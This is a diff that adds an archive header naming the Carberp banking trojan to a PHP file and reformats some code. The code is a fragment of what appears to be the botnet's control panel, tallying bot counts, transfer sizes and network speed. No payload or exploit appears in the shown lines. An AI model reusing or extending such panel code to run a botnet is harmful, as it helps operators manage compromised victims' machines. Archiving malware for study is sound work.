@@ -1,3 +1,14 @@
+/*
+  name      Carberp Botnet
+  type      trojan
+  cve       —
+  year      unknown
+  os        Windows
+  authors   unknown
+  source    krisyotam
+  archived  krisyotam (2026)
+  notes     —
+ */
 <?php
 
 if($Cur['x'] == 'download'){
@@ -28,26 +39,31 @@ $sizes['s2'] = 0;
 $sizes['s3'] = 0;
 $sizes['count_bots'] = 0;
 
-function result_data($r){	global $list, $sizes;
+function result_data($r){
+	global $list, $sizes;
 
 	if(!isset($list[$r->post_id])) $list[$r->post_id] = array('id' => $r->post_id);
 	if(isset($r->post_id)) $list[$r->post_id]['id'] = $r->post_id;
 
-	if(isset($r->s1)){		$list[$r->post_id]['s1'] = $r->s1;
+	if(isset($r->s1)){
+		$list[$r->post_id]['s1'] = $r->s1;
 		$sizes['s1'] += $r->s1;
 	}
 
-	if(isset($r->s2)){		$list[$r->post_id]['s2'] = $r->s2;
+	if(isset($r->s2)){
+		$list[$r->post_id]['s2'] = $r->s2;
 		$sizes['s2'] += $r->s2;
 	}
 
-	if(isset($r->s3)){		$list[$r->post_id]['s3'] = $r->s3;
+	if(isset($r->s3)){
+		$list[$r->post_id]['s3'] = $r->s3;
 		$sizes['s3'] += $r->s3;
 	}
 
 	if(isset($r->link)) $list[$r->post_id]['link'] = $r->link;
 
-	if(isset($r->count_bots)){		$list[$r->post_id]['count_bots'] = $r->count_bots;
+	if(isset($r->count_bots)){
+		$list[$r->post_id]['count_bots'] = $r->count_bots;
 		$sizes['count_bots'] += $r->count_bots;
 	}
 }
@@ -72,7 +88,8 @@ foreach($sdf as $item){
 
 $sd['all'] = $sd['all'] / (count($sd) - 2);
 
-if(file_exists('cache/current_speed.txt')){	$s = json_decode(file_get_contents('cache/current_speed.txt'), true);
+if(file_exists('cache/current_speed.txt')){
+	$s = json_decode(file_get_contents('cache/current_speed.txt'), true);
 	$ms = array();
 	$ms['rx'] = array();
 	$ms['tx'] = array();
